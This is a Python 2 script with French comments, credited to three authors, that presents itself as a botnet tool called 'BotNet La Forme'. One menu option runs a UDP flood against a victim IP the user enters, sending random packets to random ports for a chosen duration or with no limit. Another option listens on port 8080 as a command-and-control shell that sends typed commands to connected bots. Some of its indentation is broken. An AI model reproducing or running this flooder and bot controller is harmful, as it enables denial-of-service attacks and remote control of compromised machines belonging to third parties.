#!/usr/bin/env python
# coding: utf-8

#Importation des modules 
import socket
import threading
import sys, os
import time
import random
import Queue
from threading import Thread, current_thread

#Ip du serveur
bind_ip = "0.0.0.0" 
bind_port = 8080    

# Definition du menu
menu_actions  = {}  
 
# =======================
#     Fonctions Menu
# =======================
 
# Main menu
def main_menu():
	os.system('clear') #Fait un clear pour afficher un menu propre
	print"*********************************************************"
	print"*********************************************************"
	print"**  _            ______                                **"
	print"** | |           |  ___|                         _     **"
	print"** | |     __ _  | |_ ___  _ __ _ __ ___   ___  (_)    **"
	print"** | |    / _` | |  _/ _ \| '__| '_ ` _ \ / _ \        **"
	print"** | |___| (_| | | || (_) | |  | | | | | |  __/  _     **"
	print"** \_____/\__,_| \_| \___/|_|  |_| |_| |_|\___| (_)    **"
	print"**                                                     **"
	print"** _____ _   _  _____  ______       _   _   _      _   **"
	print"**|_   _| | | ||  ___| | ___ \     | | | \ | |    | |  **"
	print"**  | | | |_| || |__   | |_/ / ___ | |_|  \| | ___| |_ **"
	print"**  | | |  _  ||  __|  | ___ \/ _ \| __| . ` |/ _ \ __|**"
	print"**  | | | | | || |___  | |_/ / (_) | |_| |\  |  __/ |_ **"
	print"**  \_/ \_| |_/\____/  \____/ \___/ \__\_| \_/\___|\__|**"
	print"*********************************************************"
	print"*********************************************************"
	print"****BotNet La Forme Developpe  par: Guillaume Soares,****"
	print"***********Nathan  Fievez et Alexandre Villain***********"
	print"*********************************************************"
	print ""
	print "Quel est votre choix ?"
	print ""
	print "Appuyez sur 1 pour Afficher le Menu DDOS"
	print "Appuyez sur 2 pour Afficher le Menu Bot"
	print " "
	print "\n0. Quit"
	choice = raw_input(" >>  ")
	exec_menu(choice)
 
	return
 
# Execution du menu
def exec_menu(choice):
	os.system('clear') #Fait un clear pour afficher un menu propre
	ch = choice.lower()
	#Si la selecton est possible, deplace au menu voulu
	if ch == '':
		menu_actions['main_menu']()
	else:
		try:
		menu_actions[ch]()
	#Affiche message d'erreur comme quoi la selection est invalide et de reessayer en renvoyant au menu principal
	except KeyError:
		print "Selection invalide, veuillez reesseyer\n"
		menu_actions['main_menu']()
	return
 
# Menu DDOS
def menu1():
    	print "Bienvenue sur le menu DDOS \n" #Affiche un message de bienvenue
    	target = raw_input("Ip de la victime :  ") #Demande de taper l'ip de la victime
	print("===")
	package = input("Taille paquet (MAX 65500): ") #Demande la taille des paquets en bytes dont le maximum est de 65500
	print("===")
	duration = input("Duree en seconde (0 = illimite): ") #Variable Demande le temps voulu (en seconde) pour cette attaque 
	durclock = (lambda:0, time.clock)[duration > 0] #Variable se basant sur l'heure et sur le temps restant
	duration = (1, (durclock() + duration))[duration > 0] #Variable dans laquelle on défini la durée en seconde
	packet = random._urandom(package) #Variable paquet aleatoire
	sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
	print("===")
	#Affiche un message indiquant que le ddos est commencé vers quelle cible, avec la taille des paquets en bytes et pour combien de temps
	print("The UDP flood started on %s with %s bytes for %s seconds." % (target, package, duration))
	
	#tant que "vrai" Si la variable durclock est plus petite que la variable duration, faire	
	while True:
		if (durclock() < duration):
			#definition du port aleatoirement
		        port = random.randint(1, 65535)
			#envoi du packet vers la cible et le port défini aléatoirement
		        sock.sendto(packet, (target, port))
		#Sinon arrêt de la boucle	
		else:
		        break
	print("===")
	#Affiche un message indiquant que le ddos (avec le nombre de seconde) envers la cible est terminée
	print("The UDP flood has completed on %s for %s seconds." % (target, duration))
	print("===")
	#Affiche la possibilité de revenir au menu principal ou de quitter le programme
	print "9. Retour"
	print "0. Quit"	
	choice = raw_input(" >>  ")
	exec_menu(choice)
	return 


# Menu Bots
#definition du socket
server = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
server.bind((bind_ip,bind_port))  
server.listen(5) 

def handle_client(client_socket):
		print "Bienvenue sur le menu Bots\n"
		print "Nombre de Bots connectes et ouverture d'un SHELL "
		print("===")
		#Affiche etre en attente de client et ecouter sur quelle ip et sur quel port
		print "[*] En attente client - Ecoute sur %s:%d" %(bind_ip,bind_port)
		#send back the packet 
		response = raw_input("Shell >> ")
		client_socket.sendall(response)
		#print the client data
		request = client_socket.recv(2048)
		print "[*] Received: %s\n" % request
def connexion():
	#Tant que vrai, garder la connexion ouverte
	while True:
		print("===========")
		print( "En ecoute...")
		print("===========")
		client,addr = server.accept()
		print "[*] Connexion acceptee sur %s:%d" % (addr[0],addr[1])
		#threading started
		client_handler = threading.Thread(target=handle_client,args=(client,))
		client_handler.start()

	
# Retour au menu principal
def back():
    menu_actions['main_menu']()
 
# Quitter le programme
def exit():
    sys.exit()

# =======================
#    Definition menu
# =======================
 
# Menu definition
menu_actions = {
    'main_menu': main_menu,
    '1': menu1,
    '2': connexion,
    '9': back,
    '0': exit,
}
 
# =======================
#   Programme principal
# =======================
 
# Main Program
if __name__ == "__main__":
    # Launch main menu
    main_menu()
